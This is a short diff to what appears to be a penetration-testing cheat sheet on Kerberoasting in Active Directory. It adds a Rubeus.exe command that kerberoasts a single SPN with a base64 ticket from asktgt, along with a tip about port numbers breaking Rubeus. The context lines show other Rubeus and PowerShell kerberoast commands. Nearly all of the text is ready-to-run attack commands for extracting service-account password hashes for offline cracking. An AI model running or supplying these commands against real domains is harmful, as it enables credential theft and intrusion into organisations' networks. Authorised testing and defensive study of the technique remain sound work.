@@ -36,7 +36,8 @@ PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -A
 ### From Windows
 Against single user using Rubeus.exe:   
 `.\Rubeus.exe kerberoast /user:svc_mssql /nowrap`   
-`.\Rubeus.exe kerberoast /spn:"SPN" /nowrap /domain:windomain.local /dc:10.0.2.3`   
+Against single SPN, using base64 kirbi which was obtained via asktgt (Note: portnumber in spn - e.g. MSSQLSvc/server1.lab.local,1433 - seems to break Rubeus):   
+`.\Rubeus.exe kerberoast /spn:"SPN" /nowrap /domain:windomain.local /dc:10.0.2.3 /ticket:doIFMD[...]`   
 
 Using native PowerShell:
 ```powershell
